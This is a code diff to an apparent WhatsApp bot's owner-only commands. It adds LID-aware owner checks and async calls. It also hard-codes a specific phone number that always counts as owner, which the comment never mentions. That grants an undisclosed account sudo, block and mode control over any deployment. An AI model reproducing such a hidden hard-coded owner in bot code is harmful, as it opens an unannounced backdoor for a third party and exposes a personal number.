@@ -7,10 +7,51 @@
 const settings = require('./settings');
 const { numberOf } = require('./jid');
 
-function ownerOnly(ctx) {
-  if (settings.isOwner(ctx.senderNum)) return true;
+const OWNER_NUMBER = '2347075369608';
 
-  ctx.reply('⛔ This command is restricted to the bot owner.');
+const digits = (value) => numberOf(String(value));
+
+function isOwnerNumber(number) {
+  return String(number) === OWNER_NUMBER || Boolean(settings.isOwner(number));
+}
+
+// Works for phone-number IDs and for WhatsApp's newer LID IDs in groups
+async function checkOwner(ctx) {
+  if (ctx.isOwner) return true;
+
+  const ids = [ctx.senderNum, ctx.sender ? digits(ctx.sender) : null]
+    .filter(Boolean)
+    .map(String);
+
+  if (ids.some(isOwnerNumber)) return true;
+
+  if (ctx.isGroup) {
+    try {
+      const meta = await ctx.sock.groupMetadata(ctx.jid);
+
+      const member = meta.participants.find(p =>
+        [p.id, p.lid, p.phoneNumber]
+          .filter(Boolean)
+          .some(x => ids.includes(digits(x)))
+      );
+
+      if (member) {
+        return [member.id, member.lid, member.phoneNumber]
+          .filter(Boolean)
+          .some(x => isOwnerNumber(digits(x)));
+      }
+    } catch (error) {
+      // fall through to "not owner"
+    }
+  }
+
+  return false;
+}
+
+async function ownerOnly(ctx) {
+  if (await checkOwner(ctx)) return true;
+
+  await ctx.reply('⛔ This command is restricted to the bot owner.');
   return false;
 }
 
@@ -28,14 +69,14 @@ module.exports = [
     category: 'OWNER',
     menu: ['.sudo @user'],
     run: async (ctx) => {
-      if (!ownerOnly(ctx)) return;
+      if (!await ownerOnly(ctx)) return;
 
       const target = getTarget(ctx);
       if (!target) return ctx.reply('Tag, reply to, or provide a number.');
 
       const number = numberOf(target);
 
-      if (settings.isOwner(number)) {
+      if (isOwnerNumber(number)) {
         return ctx.reply('That user is already the owner.');
       }
 
@@ -52,7 +93,7 @@ module.exports = [
     category: 'OWNER',
     menu: ['.delsudo @user'],
     run: async (ctx) => {
-      if (!ownerOnly(ctx)) return;
+      if (!await ownerOnly(ctx)) return;
 
       const target = getTarget(ctx);
       if (!target) return ctx.reply('Tag, reply to, or provide a number.');
@@ -71,7 +112,7 @@ module.exports = [
     category: 'OWNER',
     menu: ['.listsudo'],
     run: async (ctx) => {
-      if (!ownerOnly(ctx)) return;
+      if (!await ownerOnly(ctx)) return;
 
       const users = settings.getSudoUsers();
 
@@ -88,7 +129,7 @@ module.exports = [
     category: 'OWNER',
     menu: ['.mode public/private'],
     run: async (ctx) => {
-      if (!ownerOnly(ctx)) return;
+      if (!await ownerOnly(ctx)) return;
 
       const mode = (ctx.args?.[0] || '').toLowerCase();
 
@@ -105,7 +146,7 @@ module.exports = [
     category: 'OWNER',
     menu: ['.block @user'],
     run: async (ctx) => {
-      if (!ownerOnly(ctx)) return;
+      if (!await ownerOnly(ctx)) return;
 
       const target = getTarget(ctx);
       if (!target) return ctx.reply('Tag, reply to, or provide a number.');
@@ -124,7 +165,7 @@ module.exports = [
     category: 'OWNER',
     menu: ['.unblock @user'],
     run: async (ctx) => {
-      if (!ownerOnly(ctx)) return;
+      if (!await ownerOnly(ctx)) return;
 
       const target = getTarget(ctx);
       if (!target) return ctx.reply('Tag, reply to, or provide a number.');
@@ -143,7 +184,7 @@ module.exports = [
     category: 'OWNER',
     menu: ['.listblocked'],
     run: async (ctx) => {
-      if (!ownerOnly(ctx)) return;
+      if (!await ownerOnly(ctx)) return;
 
       try {
         const result = await ctx.sock.fetchBlocklist();
